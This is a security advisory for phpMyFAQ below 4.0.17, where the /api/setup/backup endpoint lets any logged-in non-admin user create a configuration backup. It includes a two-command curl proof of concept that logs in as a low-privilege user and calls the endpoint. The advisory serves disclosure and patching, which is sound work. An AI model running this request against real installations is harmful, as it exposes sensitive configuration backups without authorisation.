# [M] phpMyFAQ: /api/setup/backup accessible to any authenticated user (authz missing)

## Summary
Severity: Medium
Advisory: GHSA-wm8h-26fv-mg7g
CVE: CVE-2026-24421
CWE: CWE-285, CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-01-23
Source: https://github.com/advisories/GHSA-wm8h-26fv-mg7g
Type: github-advisory

## Affected
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.0.17
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.0.17

## Details
### Summary
Authenticated non‑admin users can call /api/setup/backup and trigger a configuration backup. The endpoint only checks authentication, not authorization, and returns a link to the generated ZIP.

### Details
SetupController.php uses userIsAuthenticated() but does not verify that the requester has configuration/admin permissions. This allows any logged‑in user to create a sensitive backup and retrieve its path.

### PoC
Precondition: API enabled, any authenticated non‑admin user.
- Log in as a non‑admin user.
- Call backup endpoint.
```
curl -c /tmp/pmf_api_cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{"username":"tester","password":"Test1234!"}' \
  http://192.168.40.16/phpmyfaq/api/v3.0/login

curl -i -b /tmp/pmf_api_cookies.txt \
  -X POST --data '4.0.16' \
  http://192.168.40.16/phpmyfaq/api/setup/backup
```

### Impact
Low‑privileged users can generate sensitive backups. If the ZIP is web‑accessible (server misconfiguration), this can lead to secret exposure.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-wm8h-26fv-mg7g
- https://nvd.nist.gov/vuln/detail/CVE-2026-24421
- https://github.com/thorsten/phpMyFAQ
